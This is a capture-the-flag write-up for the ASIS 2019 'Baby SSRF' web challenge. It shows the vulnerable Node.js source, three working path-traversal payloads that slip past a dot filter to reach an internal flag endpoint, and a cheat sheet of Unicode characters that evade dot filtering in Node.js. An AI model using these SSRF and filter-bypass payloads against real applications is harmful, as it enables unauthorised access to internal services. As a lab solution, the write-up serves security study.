# ASIS CTF quals - 2019

## Baby SSRF - 70 / Web

Description:
The goats thought they were safe behind the walls from the threat of the wolf!
But they were not aware of the wolf's plan to bypass the wall!

### Solution

The first hint was in the header, then we can get the source code:

```
HTTP/1.1 200 OK
X-Powered-By: Express
GET: source
Content-Type: text/html; charset=utf-8
Content-Length: 22
ETag: W/"16-Ypo4AziLbHOiFWFpNXHkFH9U8Dc"
Date: Tue, 23 Apr 2019 16:55:11 GMT
Connection: close

Hi, I'm a baby ssrf :)
```

Here's the source code.

```=node.js=1
const express = require("express");
const body_parser = require('body-parser');
const http = require('http')
const public_s = express();
const private_s = express();
const normalizeUrl = require('normalize-url');

public_s.use(body_parser.urlencoded({
    extended: true
}));

public_s.get('/', function (request, result) {
    result.setHeader('GET', 'source')
    result.send("Hi, I'm a baby ssrf :)")
    result.end()
})

public_s.get('/source', function(req, res) {
    res.sendFile(__filename)
  })

public_s.use(function (req, res, next) {
    var err = null;
    try {
        decodeURIComponent(req.path)
    } catch (e) {
        err = e;
    }
    if (err) {
        res.sendStatus(400).end()
    }
    next();
});

public_s.post('/open/', (request, result) => {
    document_name = request.body.document_name

    if (document_name === undefined) {
        result.end('bad')
    }
    console.log('http://localhost:9000/documents/' + document_name)
    if (document_name.indexOf('.') >= 0 ||
        document_name.indexOf("2e") >= 0 ||
        document_name.indexOf("┮") >= 0 ||
        document_name.indexOf("Ｅ") >= 0 ||
        document_name.indexOf("Ｎ") >= 0) {
        result.end('Please get your banana and leave!')
    } else {
        try {
            var go_url = normalizeUrl('http://localhost:9000/documents/' + document_name)
        } catch(error) {
            var go_url = 'http://localhost:9000/documents/banana'
        }
        http.get(go_url, function (res) {
            res.setEncoding('utf8');

            if (res.statusCode == 200) {
                res.on('data', function (chunk) {
                    result.send(chunk)
                    result.end()
                });
            } else {
                result.end('Oops')
            }
        }).on('error', function (e) {
            console.log("Got error: " + e.message);
        });
    }
})

public_s.listen(8000)
private_s.listen(9000)

private_s.get('/documents/banana', function (request, result) {
    result.send("Here is your banana :D")
    result.end()
})

private_s.get('/flag', function (request, result) {
    result.send("flag{flag_is_here}")
    result.end()
})
```

We have to access the `http://localhost:9000/flag` to get flag.
But the common symbols to do path traversal was blocked：`.`、`2e`

Even the unicode bypass char was blocked：`┮`、`Ｎ`、`Ｅ`
(from Orange Tsai：[A New Era Of SSRF](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf))

After few tries on the local, we can bypass easily by triple encoding、request with object type.
You could even just use `%2E` because of the block char `%2e` wasn't case sensitive.

```
### console.log for test ###

console.log('Origin:    http://localhost:9001/documents/' + document_name)
console.log('Normalize: ' + normalizeUrl('http://localhost:9001/documents/' + document_name))
console.log('Typeof:    ' + typeof(document_name))
console.log('indexOf(.):' + document_name.indexOf('.'))

######

#1 bypass with triple encoding
Request args：document_name_get=%25%32%45%25%32%45/flag
Origin:    http://localhost:9001/documents/%2E%2E/flag
Normalize: http://localhost:9001/flag
Typeof:    string
indexOf(.):-1

#2 bypass with case sensitive
Request args：document_name_get=%252E%252E/flag
Origin:    http://localhost:9001/documents/%2E%2E/flag
Normalize: http://localhost:9001/flag
Typeof:    string
indexOf(.):-1

#3 bypass with object
Request args：document_name_get=foo&document_name_get=/../../flag
Origin:    http://localhost:9001/documents/foo,/../../flag
Normalize: http://localhost:9001/flag
Typeof:    object
indexOf(.):-1
```

`ASIS{68aaf2e4dd0e7ba28622aaed383bef4f}`



### Reference

https://blog.ssrf.in/post/nodejs-unicode-encoding-and-ssrf/
https://mathiasbynens.be/notes/javascript-encoding



## Bonus: Node.js dot bypass cheat sheet

```
Decimal	HEX	Character
1	01	Į
2	02	Ȯ
3	03	̮
4	04	Ю
5	05	Ԯ
6	06	خ
7	07	ܮ
8	08	࠮
9	09	म
10	0a	ਮ
11	0b	ମ
12	0c	మ
13	0d	മ
14	0e	ฮ
15	0f	༮
16	10	ီ
17	11	ᄮ
18	12	ሮ
19	13	ጮ
20	14	ᐮ
21	15	ᔮ
22	16	ᘮ
23	17	ᜮ
24	18	ᠮ
25	19	᤮
26	1a	ᨮ
27	1b	ᬮ
28	1c	ᰮ
29	1d	ᴮ
30	1e	Ḯ
31	1f	Ἦ
32	20	‮
33	21	℮
34	22	∮
35	23	⌮
36	24	␮
37	25	┮
38	26	☮
39	27	✮
40	28	⠮
41	29	⤮
42	2a	⨮
43	2b	⬮
44	2c	Ⱞ
45	2d	⴮
46	2e	⸮
47	2f	⼮
48	30	〮
49	31	ㄮ
50	32	㈮
51	33	㌮
52	34	㐮
53	35	㔮
54	36	㘮
55	37	㜮
56	38	㠮
57	39	㤮
58	3a	㨮
59	3b	㬮
60	3c	㰮
61	3d	㴮
62	3e	㸮
63	3f	㼮
64	40	䀮
65	41	䄮
66	42	䈮
67	43	䌮
68	44	䐮
69	45	䔮
70	46	䘮
71	47	䜮
72	48	䠮
73	49	䤮
74	4a	䨮
75	4b	䬮
76	4c	䰮
77	4d	䴮
78	4e	丮
79	4f	伮
80	50	倮
81	51	儮
82	52	刮
83	53	匮
84	54	吮
85	55	售
86	56	嘮
87	57	圮
88	58	堮
89	59	央
90	5a	娮
91	5b	嬮
92	5c	尮
93	5d	崮
94	5e	帮
95	5f	弮
96	60	怮
97	61	愮
98	62	戮
99	63	挮
100	64	搮
101	65	攮
102	66	昮
103	67	朮
104	68	栮
105	69	椮
106	6a	樮
107	6b	欮
108	6c	氮
109	6d	洮
110	6e	渮
111	6f	漮
112	70	瀮
113	71	焮
114	72	爮
115	73	献
116	74	琮
117	75	甮
118	76	瘮
119	77	眮
120	78	砮
121	79	礮
122	7a	種
123	7b	笮
124	7c	簮
125	7d	紮
126	7e	縮
127	7f	缮
128	80	耮
129	81	脮
130	82	舮
131	83	茮
132	84	萮
133	85	蔮
134	86	蘮
135	87	蜮
136	88	蠮
137	89	褮
138	8a	訮
139	8b	謮
140	8c	谮
141	8d	贮
142	8e	踮
143	8f	輮
144	90	逮
145	91	鄮
146	92	鈮
147	93	錮
148	94	鐮
149	95	键
150	96	阮
151	97	霮
152	98	頮
153	99	餮
154	9a	騮
155	9b	鬮
156	9c	鰮
157	9d	鴮
158	9e	鸮
159	9f	鼮
160	a0	ꀮ
161	a1	ꄮ
162	a2	ꈮ
163	a3	ꌮ
164	a4	ꐮ
165	a5	ꔮ
166	a6	꘮
167	a7	Ꜯ
168	a8	꠮
169	a9	꤮
170	aa	ꨮ
171	ab	ꬮ
172	ac	갮
173	ad	괮
174	ae	긮
175	af	꼮
176	b0	뀮
177	b1	넮
178	b2	눮
179	b3	댮
180	b4	됮
181	b5	딮
182	b6	똮
183	b7	뜮
184	b8	렮
185	b9	뤮
186	ba	먮
187	bb	묮
188	bc	밮
189	bd	봮
190	be	븮
191	bf	뼮
192	c0	쀮
193	c1	섮
194	c2	숮
195	c3	쌮
196	c4	쐮
197	c5	씮
198	c6	옮
199	c7	윮
200	c8	젮
201	c9	줮
202	ca	쨮
203	cb	쬮
204	cc	찮
205	cd	촮
206	ce	츮
207	cf	켮
208	d0	퀮
209	d1	턮
210	d2	툮
211	d3	팮
212	d4	퐮
213	d5	픮
214	d6	혮
215	d7	휮
224	e0	
225	e1	
226	e2	
227	e3	
228	e4	
229	e5	
230	e6	
231	e7	
232	e8	
233	e9	
234	ea	
235	eb	
236	ec	
237	ed	
238	ee	
239	ef	
240	f0	
241	f1	
242	f2	
243	f3	
244	f4	
245	f5	
246	f6	
247	f7	
248	f8	
249	f9	冷
250	fa	郞
251	fb	אַ
252	fc	ﰮ
253	fd	ﴮ
254	fe	︮
255	ff	Ｎ
```

#ssrf #easy #Node.js
